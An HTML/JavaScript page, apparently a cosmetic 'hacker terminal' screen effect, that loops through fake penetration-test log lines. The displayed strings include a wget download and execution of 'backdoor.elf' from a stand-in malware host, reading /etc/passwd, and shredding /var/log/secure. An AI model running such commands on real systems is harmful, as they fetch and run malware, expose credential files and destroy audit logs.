<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AUTO MATRIX TERMINAL - OVERRIDE V2.0</title>
    <style>
        body {
            background-color: #020202; /* 極致深黑 */
            color: #39ff14; /* 螢光霓虹綠 */
            font-family: 'Courier New', Courier, monospace;
            font-size: 16px;
            line-height: 1.5;
            margin: 0;
            padding: 25px;
            overflow: hidden;
            height: 100vh;
            /* 經典 CRT 螢幕發光特效 */
            text-shadow: 0 0 4px rgba(57, 255, 20, 0.7);
            background-image: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%);
            background-size: 100% 4px;
        }

        #container {
            width: 100%;
            height: 100%;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        /* 成功/通過狀態 */
        .status-ok {
            color: #00ffcc;
            font-weight: bold;
            text-shadow: 0 0 8px rgba(0, 255, 204, 0.9);
        }

        /* 警告/正在執行狀態 */
        .status-action {
            color: #ffff00;
            text-shadow: 0 0 6px rgba(255, 255, 0, 0.8);
        }

        /* 關鍵危險指令 */
        .status-alert {
            color: #ff3333;
            font-weight: bold;
            text-shadow: 0 0 10px rgba(255, 51, 51, 0.9);
        }

        /* 模擬閃爍游標 */
        #cursor {
            display: inline-block;
            width: 10px;
            height: 1.2em;
            background-color: #39ff14;
            vertical-align: bottom;
            animation: blink 0.6s infinite;
            box-shadow: 0 0 8px #39ff14;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            50.1%, 100% { opacity: 0; }
        }

        /* 隱藏右側原生滾動條 */
        ::-webkit-scrollbar {
            width: 0px;
            background: transparent;
        }
    </style>
</head>
<body>
    <div id="container"><span id="output"></span><span id="cursor"></span></div>

    <script>
        // 核心黑客指令池
        const logTemplates = [
            () => `root@kali-arc:~# nmap -sV -T4 -p- 10.0.${rand(255)}.${rand(255)}\n`,
            () => `Scanning network vector... <span class='status-action'>[SEARCHING OPEN PORTS]</span>\n`,
            () => `Discovered service on port ${rand(9000)}: <span class='status-ok'>HTTP Apache/2.4.41 (Ubuntu)</span>\n`,
            () => `root@kali-arc:~# ./exploit_v${rand(9)} --target 172.16.${rand(100)}.4 --payload=reverse_tcp\n`,
            () => `<span class='status-action'>[ATTEMPT] Injecting buffer overflow payload at memory stack: 0x${randHex(8)}</span>\n`,
            () => `Stack pointer offset: ${rand(1024)} bytes -> <span class='status-ok'>[ALIGNED]</span>\n`,
            () => `Progress: [${"■".repeat(rand(6)+10)}${"□".repeat(6)}] 74%... Loading Binaries\n`,
            () => `Progress: [■■■■■■■■■■■■■■■■] 100% -> <span class='status-ok'>[SUCCESS]</span>\n`,
            () => `<span class='status-ok'>[OK] EXPLOIT SUCCESSFUL. SPAWNING ROOT SHELL ON SUBNET...</span>\n`,
            () => `root@target-server:/# cat /etc/passwd | grep -E "admin|root"\n`,
            () => `Found matching hash: <span class='status-action'>$6$zQ9X${randHex(12)}...</span>\n`,
            () => `Launching multi-threaded brute force dictionary attack [Threads: 64]\n`,
            () => `Testing speed: ${rand(50)+50},421 keys/sec... \n`,
            () => `<span class='status-ok'>[SUCCESS] PASSWORD CRACKED: "admin_master_${rand(9999)}!"</span>\n`,
            () => `root@target-server:/# wget http://malware-vault.net/payload/backdoor.elf\n`,
            () => `Connecting to malware-vault.net... <span class='status-ok'>CONNECTED.</span> Sending request.\n`,
            () => `Length: 4,194,304 (4.0M) [application/x-executable]\n`,
            () => `Saving to: 'backdoor.elf' [■■■■■■■■■■■■■■■■] 100% \n`,
            () => `root@target-server:/# chmod +x backdoor.elf && ./backdoor.elf --daemon\n`,
            () => `<span class='status-ok'>[CONNECTION] BACKDOOR ESTABLISHED BACK TO IP: 192.168.1.150:4444</span>\n`,
            () => `<span class='status-alert'>[WARNING] FIREWALL INTRUSION DETECTION SYSTEM TRIGGERED!</span>\n`,
            () => `<span class='status-action'>[BYPASS] Executing log scrub protocol (shred /var/log/secure)...</span>\n`,
            () => `Deleting footprints... <span class='status-ok'>[CLEAN] 234 log entries zeroed out.</span>\n`,
            () => `root@kali-arc:~# ssh-keygen -f "/root/.ssh/known_hosts" -R "10.0.1.50"\n`,
            () => `-----------------------------------------------------------\n`,
            () => `<span class='status-ok'>[SYSTEM STATUS] TARGET MAIN CORE SUCCESSFULLY COMPROMISED.</span>\n`,
            () => `-----------------------------------------------------------\n`
        ];

        // 輔助工具：隨機數字與十六進位（讓資料看起來每次都不同）
        function rand(max) { return Math.floor(Math.random() * max); }
        function randHex(len) {
            const chars = '0123456789ABCDEF';
            let result = '';
            for (let i = 0; i < len; i++) result += chars[rand(16)];
            return result;
        }

        const outputSpan = document.getElementById('output');
        const container = document.getElementById('container');
        
        let templateIndex = 0;

        function autoType() {
            // 從池子裡拿出一行指令模板並生成
            const nextLine = logTemplates[templateIndex]();
            outputSpan.innerHTML += nextLine;
            
            // 指令索引遞增，到尾端就歸零無限循環
            templateIndex = (templateIndex + 1) % logTemplates.length;

            // 超極限自動滾動到底部
            container.scrollTop = container.scrollHeight;

            // 超快速推進：隨機 30 毫秒 到 120 毫秒跑出一條，速度感極強
            const fastSpeed = Math.random() * 90 + 30;
            setTimeout(autoType, fastSpeed);
        }

        // 網頁載入後，直接全自動瘋狂推進
        window.onload = () => {
            outputSpan.innerHTML = "<span class='status-action'>[SYSTEM] INITIALIZING AUTO-PILOT INFILTRATION MULTIPLEXER...</span>\n\n";
            setTimeout(autoType, 800);
        };
    </script>
</body>
</html>
